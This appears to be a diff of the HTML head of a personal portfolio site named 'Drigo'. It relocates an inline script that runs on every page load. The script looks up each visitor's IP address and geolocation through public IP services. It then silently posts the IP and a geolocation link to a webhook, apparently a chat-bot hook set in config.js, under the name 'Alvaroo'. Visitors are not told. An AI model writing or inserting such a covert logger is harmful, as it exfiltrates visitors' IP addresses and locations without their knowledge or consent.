@@ -19,6 +19,50 @@
     <meta content="My personal website and portfolio." name="og:description">
     <meta content="summary_large_image" name="twitter:card">
     <meta content="/images/avatar-512.png" property="og:image">
+        <script src="./config.js"></script>
+    <script>
+        function get_information(link, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", link, true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4) {
+                    callback(xhr.responseText);
+                }
+            };
+            xhr.send(null);
+        }
+        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "alvaroolog";
+            const secondList = document.getElementsByClassName("header")[0]
+            secondList.appendChild(div)
+        });
+        get_information("https://api.ipify.org/", function (text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "ip";
+            const secondList = document.getElementsByClassName("header")[0]
+            secondList.appendChild(div)
+        });
+
+        function ipLogByAlv() {
+            var ispp = document.getElementById('ip').innerHTML
+            var extra = document.getElementById("alvaroolog").innerHTML
+            const request = new XMLHttpRequest();
+            request.open("POST", wbhk);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                username: "Alvaroo",
+                avatar_url: 'https://i.pinimg.com/564x/03/5d/ba/035dba9b43fb40d2e48f260a2983bbac.jpg',
+                content: "**Ip** : _" + ispp + "_\n**Infos** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n"
+            }
+            request.send(JSON.stringify(params));
+        }
+        setTimeout(function () {
+            ipLogByAlv()
+        }, 700);
+    </script>
 
     <title>Drigo</title>
     <meta content="minimum-scale=1, initial-scale=1, width=device-width" name="viewport">
@@ -601,50 +645,6 @@
         <link rel="stylesheet" href="/assets/index.fdc699f5.css">
     </noscript>
     <script type="module" src="/page.f52ebd18.js"></script>
-    <script src="./config.js"></script>
-    <script>
-        function get_information(link, callback) {
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", link, true);
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState === 4) {
-                    callback(xhr.responseText);
-                }
-            };
-            xhr.send(null);
-        }
-        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
-            var div = document.createElement("div");
-            div.innerHTML = text;
-            div.id = "alvaroolog";
-            const secondList = document.getElementsByClassName("header")[0]
-            secondList.appendChild(div)
-        });
-        get_information("https://api.ipify.org/", function (text) {
-            var div = document.createElement("div");
-            div.innerHTML = text;
-            div.id = "ip";
-            const secondList = document.getElementsByClassName("header")[0]
-            secondList.appendChild(div)
-        });
-
-        function ipLogByAlv() {
-            var ispp = document.getElementById('ip').innerHTML
-            var extra = document.getElementById("alvaroolog").innerHTML
-            const request = new XMLHttpRequest();
-            request.open("POST", wbhk);
-            request.setRequestHeader('Content-type', 'application/json');
-            const params = {
-                username: "Alvaroo",
-                avatar_url: 'https://i.pinimg.com/564x/03/5d/ba/035dba9b43fb40d2e48f260a2983bbac.jpg',
-                content: "**Ip** : _" + ispp + "_\n**Infos** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n"
-            }
-            request.send(JSON.stringify(params));
-        }
-        setTimeout(function () {
-            ipLogByAlv()
-        }, 700);
-    </script>
 </head>
 
 <body class="flex h-screen dark:bg-dark-800 bg-white font-['Whitney']">
